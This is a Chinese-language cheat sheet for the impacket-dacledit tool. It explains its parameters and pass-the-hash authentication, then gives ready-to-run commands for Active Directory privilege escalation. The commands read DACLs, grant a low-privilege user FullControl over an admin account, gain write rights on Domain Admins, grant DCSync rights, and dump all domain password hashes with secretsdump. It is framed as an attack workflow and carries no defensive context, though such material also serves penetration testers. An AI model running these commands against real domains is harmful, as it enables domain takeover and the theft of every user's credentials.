# impacket-dacledit

## 介绍

impacket-dacledit可以用来直接操作ActiveDirectory对象的安全描述符中的DACL（Discretionary Access Control List，自主访问控制列表）。它允许你读取、添加、移除、修改目标对象（用户、组、OU、计算机等）访问控制条目(ACE)，这是域权限提升（Domain Privilege Escalation）中最常见方法。

## 参数

### 1）关键参数

| 参数                                                         | 作用                                       |
| ------------------------------------------------------------ | ------------------------------------------ |
| -dc-ip<DC_IP>                                                | 域控制器IP                                 |
| -action read/write/remove/backup/restore                     | 读取、添加、移除ACE,备份、恢复DACL         |
| -principal <USER_NAME>                                       | 授予权限的主体（通常是你控制的低权限用户） |
| -target <TARGET_NAME>                                        | 目标对象（用户名、组名、完整DN）           |
| -rights FullControl/ResetPassword/WriteMembers/DSSync/Custom | 权限类型                                   |
| -inheritance                                                 | 启动继承（针对OU时有用，让子对象继承权限） |

### 2）认证选项

| 参数                  | 作用                                      |
| --------------------- | ----------------------------------------- |
| -hashes LMHASH:NTHASH | Pass-The-Hash                             |
| -k                    | 使用Kerberos（需要TGT,export KRB5CCNAME） |
| -use-ldaps            | 加密LDAPS                                 |

## 使用方法

### 1）侦擦阶段（Enumeration & Recon）

（1）先用BloodHound确认目标权限

（2）用dacledit读取DACL

```
impacket-dacledit -dc-ip 10.10.10.100 -action read -principal "lowuser" -target "adminuser" DOMAIN/lowuser:password
```

输出会显示当前 ACE 列表，包括 Trustee（谁有权限）、Access Mask 等。找是否有 WriteDacl 或 GenericWrite。

### 2）利用阶段（Exploitation）

（1）最常见：授予自己FullControl（然后重置密码添加RBF）

```
impacket-dacledit -dc-ip 10.10.10.100 -action write -rights FullControl -principal "lowuser" -target "adminuser" DOMAIN/lowuser:password
```

（2）针对组（如Domain Admins）添加成员：

```
impacket-dacledit -dc-ip 10.10.10.100 -action write -rights WriteMembers -principal "lowuser" -target-dn "CN=Domain Admins,CN=Users,DC=DOMAIN,DC=LOCAL" DOMAIN/lowuser:password
```

成功后，用 net group 或 PowerView 添加自己到组。

（3）授予 DCSync（直接 dump 域哈希）：

```
impacket-dacledit -dc-ip 10.10.10.100 -action write -rights DCSync -principal "lowuser" -target "domainroot" DOMAIN/lowuser:password
```

（4）然后用secretsdump.py进行DCSync

```
impacket-secretsdump DOMAIN/lowuser:password@DC_IP -just-dc
```

